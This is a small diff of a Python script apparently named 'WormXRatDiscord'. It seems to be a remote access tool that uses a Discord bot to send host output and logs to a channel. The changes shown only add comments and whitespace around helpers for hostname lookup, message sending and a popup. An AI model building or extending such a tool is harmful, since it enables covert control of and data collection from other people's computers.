@@ -12,6 +12,7 @@ import io
 import threading
 from tkinter import messagebox
 
+# Config
 session = uuid.uuid4()
 TOKEN = "" # <------ Token discord
 
@@ -31,14 +32,14 @@ channel_ref = None
 
 def get_hostname():
     return socket.gethostname().lower().replace(" ", "-")
-
+    
 async def send_msg(channel, text):
     if len(text) > 1900:
         with io.BytesIO(text.encode('utf-8')) as out_file:
             await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
     else:
         await channel.send(f"```\n{text}\n```")
-
+# Sending message in popup
 def show_popup(msg):
     messagebox.showinfo("WormXRatDiscord", msg)
 
